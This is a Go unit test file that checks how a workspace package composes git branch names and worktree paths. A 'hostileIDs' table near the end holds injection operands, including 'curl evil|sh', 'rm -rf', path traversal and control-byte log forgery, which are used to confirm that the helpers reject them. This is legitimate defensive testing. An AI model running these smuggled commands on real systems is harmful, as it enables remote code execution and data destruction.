package workspace

import (
	"path/filepath"
	"testing"

	"github.com/mrmaxsteel/mindspec/internal/config"
)

func TestSpecBranch(t *testing.T) {
	tests := []struct {
		specID string
		want   string
	}{
		{"053-drop-state-json", "spec/053-drop-state-json"},
		{"001-skeleton", "spec/001-skeleton"},
	}
	for _, tt := range tests {
		got, err := SpecBranch(tt.specID)
		if err != nil {
			t.Fatalf("SpecBranch(%q) unexpected error: %v", tt.specID, err)
		}
		if got != tt.want {
			t.Errorf("SpecBranch(%q) = %q, want %q", tt.specID, got, tt.want)
		}
	}
}

func TestBeadBranch(t *testing.T) {
	got, err := BeadBranch("mindspec-c8q0")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "bead/mindspec-c8q0"
	if got != want {
		t.Errorf("BeadBranch = %q, want %q", got, want)
	}
}

func TestSpecWorktreeName(t *testing.T) {
	got, err := SpecWorktreeName("053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "worktree-spec-053-foo"
	if got != want {
		t.Errorf("SpecWorktreeName = %q, want %q", got, want)
	}
}

func TestBeadWorktreeName(t *testing.T) {
	got, err := BeadWorktreeName("mindspec-c8q0")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "worktree-mindspec-c8q0"
	if got != want {
		t.Errorf("BeadWorktreeName = %q, want %q", got, want)
	}
}

func TestFinalizeBranch(t *testing.T) {
	got, err := FinalizeBranch("053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "chore/finalize-053-foo"
	if got != want {
		t.Errorf("FinalizeBranch = %q, want %q", got, want)
	}
}

func TestFinalizeWorktreeName(t *testing.T) {
	got, err := FinalizeWorktreeName("053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "worktree-finalize-053-foo"
	if got != want {
		t.Errorf("FinalizeWorktreeName = %q, want %q", got, want)
	}
}

func TestSpecWorktreePath(t *testing.T) {
	got, err := SpecWorktreePath("/project", config.DefaultConfig(), "053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join("/project", ".worktrees", "worktree-spec-053-foo")
	if got != want {
		t.Errorf("SpecWorktreePath = %q, want %q", got, want)
	}
}

func TestBeadWorktreePath(t *testing.T) {
	specWT := filepath.Join("/project", ".worktrees", "worktree-spec-053-foo")
	got, err := BeadWorktreePath(specWT, config.DefaultConfig(), "mindspec-mol-07lst")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join(specWT, ".worktrees", "worktree-mindspec-mol-07lst")
	if got != want {
		t.Errorf("BeadWorktreePath = %q, want %q", got, want)
	}
}

func TestFinalizeWorktreePath(t *testing.T) {
	got, err := FinalizeWorktreePath("/project", config.DefaultConfig(), "053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join("/project", ".worktrees", "worktree-finalize-053-foo")
	if got != want {
		t.Errorf("FinalizeWorktreePath = %q, want %q", got, want)
	}
}

func TestFinalizeWorktreePath_HonorsCustomWorktreeRoot(t *testing.T) {
	cfg := config.DefaultConfig()
	cfg.WorktreeRoot = ".trees"
	got, err := FinalizeWorktreePath("/project", cfg, "053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join("/project", ".trees", "worktree-finalize-053-foo")
	if got != want {
		t.Errorf("FinalizeWorktreePath with custom root = %q, want %q", got, want)
	}
}

func TestSpecWorktreePath_HonorsCustomWorktreeRoot(t *testing.T) {
	cfg := config.DefaultConfig()
	cfg.WorktreeRoot = ".trees"
	got, err := SpecWorktreePath("/project", cfg, "053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join("/project", ".trees", "worktree-spec-053-foo")
	if got != want {
		t.Errorf("SpecWorktreePath with custom root = %q, want %q", got, want)
	}
}

func TestBeadWorktreePath_HonorsCustomWorktreeRoot(t *testing.T) {
	cfg := config.DefaultConfig()
	cfg.WorktreeRoot = ".trees"
	specWT := filepath.Join("/project", ".trees", "worktree-spec-053-foo")
	got, err := BeadWorktreePath(specWT, cfg, "mindspec-c8q0")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join(specWT, ".trees", "worktree-mindspec-c8q0")
	if got != want {
		t.Errorf("BeadWorktreePath with custom root = %q, want %q", got, want)
	}
}

func TestSpecWorktreePath_NilConfigUsesDefault(t *testing.T) {
	got, err := SpecWorktreePath("/project", nil, "053-foo")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := filepath.Join("/project", ".worktrees", "worktree-spec-053-foo")
	if got != want {
		t.Errorf("SpecWorktreePath(nil cfg) = %q, want %q", got, want)
	}
}

func TestWorktreesDir(t *testing.T) {
	cfg := config.DefaultConfig()
	cfg.WorktreeRoot = ".trees"
	got := WorktreesDir("/project", cfg)
	want := filepath.Join("/project", ".trees")
	if got != want {
		t.Errorf("WorktreesDir = %q, want %q", got, want)
	}
}

func TestDefaultWorktreesDir(t *testing.T) {
	got := DefaultWorktreesDir("/project")
	want := filepath.Join("/project", ".worktrees")
	if got != want {
		t.Errorf("DefaultWorktreesDir = %q, want %q", got, want)
	}
}

// hostileIDs is the shared hostile-operand table (spec 120 Testing
// Strategy): metacharacters, traversal, and the 116 control-byte triple.
var hostileIDs = []string{
	".worktrees && curl evil|sh #",
	"../../outside",
	"x evil; rm -rf",
	"x\x00\x1b[31m\nrecovery: forged",
	"--help",
	"",
}

// cleanSpecShapes is the round-3 clean-shape set every byte-identity
// subtest must include: a letter-suffixed spec dir.
var cleanSpecShapes = []string{
	"053-drop-state-json",
	"008b-human-gates",
	"120-trust-boundary-render-audit",
}

// cleanBeadShapes is the round-3 clean-shape set: dotted child,
// multi-level child, legacy short suffix.
var cleanBeadShapes = []string{
	"mindspec-9cyu.1",
	"mindspec-69y.2.2",
	"mindspec-0ke",
	"mindspec-c8q0",
}

// TestCompositionHelpersRejectInvalidIDs is spec 120 AC-2: each of the
// nine newly-validating workspace composition helpers errors on every
// hostile-operand ID and returns byte-identical compositions for the full
// clean-shape set (incl. dotted child + "008b" spec form). SpecDir's
// existing contract is unchanged (it already validated pre-120).
func TestCompositionHelpersRejectInvalidIDs(t *testing.T) {
	cfg := config.DefaultConfig()

	t.Run("hostile specID helpers reject", func(t *testing.T) {
		for _, hostile := range hostileIDs {
			if _, err := SpecBranch(hostile); err == nil {
				t.Errorf("SpecBranch(%q) accepted a hostile id", hostile)
			}
			if _, err := SpecWorktreeName(hostile); err == nil {
				t.Errorf("SpecWorktreeName(%q) accepted a hostile id", hostile)
			}
			if _, err := SpecWorktreePath("/project", cfg, hostile); err == nil {
				t.Errorf("SpecWorktreePath(%q) accepted a hostile id", hostile)
			}
			if _, err := FinalizeBranch(hostile); err == nil {
				t.Errorf("FinalizeBranch(%q) accepted a hostile id", hostile)
			}
			if _, err := FinalizeWorktreeName(hostile); err == nil {
				t.Errorf("FinalizeWorktreeName(%q) accepted a hostile id", hostile)
			}
			if _, err := FinalizeWorktreePath("/project", cfg, hostile); err == nil {
				t.Errorf("FinalizeWorktreePath(%q) accepted a hostile id", hostile)
			}
			if _, err := SpecDir("/project", hostile); err == nil {
				t.Errorf("SpecDir(%q) accepted a hostile id", hostile)
			}
		}
	})

	t.Run("hostile beadID helpers reject", func(t *testing.T) {
		for _, hostile := range hostileIDs {
			if _, err := BeadBranch(hostile); err == nil {
				t.Errorf("BeadBranch(%q) accepted a hostile id", hostile)
			}
			if _, err := BeadWorktreeName(hostile); err == nil {
				t.Errorf("BeadWorktreeName(%q) accepted a hostile id", hostile)
			}
			if _, err := BeadWorktreePath("/project", cfg, hostile); err == nil {
				t.Errorf("BeadWorktreePath(%q) accepted a hostile id", hostile)
			}
		}
	})

	t.Run("clean spec shapes byte-identical", func(t *testing.T) {
		for _, specID := range cleanSpecShapes {
			branch, err := SpecBranch(specID)
			if err != nil {
				t.Fatalf("SpecBranch(%q): %v", specID, err)
			}
			if want := "spec/" + specID; branch != want {
				t.Errorf("SpecBranch(%q) = %q, want %q", specID, branch, want)
			}
			name, err := SpecWorktreeName(specID)
			if err != nil {
				t.Fatalf("SpecWorktreeName(%q): %v", specID, err)
			}
			if want := "worktree-spec-" + specID; name != want {
				t.Errorf("SpecWorktreeName(%q) = %q, want %q", specID, name, want)
			}
			fb, err := FinalizeBranch(specID)
			if err != nil {
				t.Fatalf("FinalizeBranch(%q): %v", specID, err)
			}
			if want := "chore/finalize-" + specID; fb != want {
				t.Errorf("FinalizeBranch(%q) = %q, want %q", specID, fb, want)
			}
		}
	})

	t.Run("clean bead shapes byte-identical", func(t *testing.T) {
		for _, beadID := range cleanBeadShapes {
			branch, err := BeadBranch(beadID)
			if err != nil {
				t.Fatalf("BeadBranch(%q): %v", beadID, err)
			}
			if want := "bead/" + beadID; branch != want {
				t.Errorf("BeadBranch(%q) = %q, want %q", beadID, branch, want)
			}
			name, err := BeadWorktreeName(beadID)
			if err != nil {
				t.Fatalf("BeadWorktreeName(%q): %v", beadID, err)
			}
			if want := "worktree-" + beadID; name != want {
				t.Errorf("BeadWorktreeName(%q) = %q, want %q", beadID, name, want)
			}
		}
	})
}
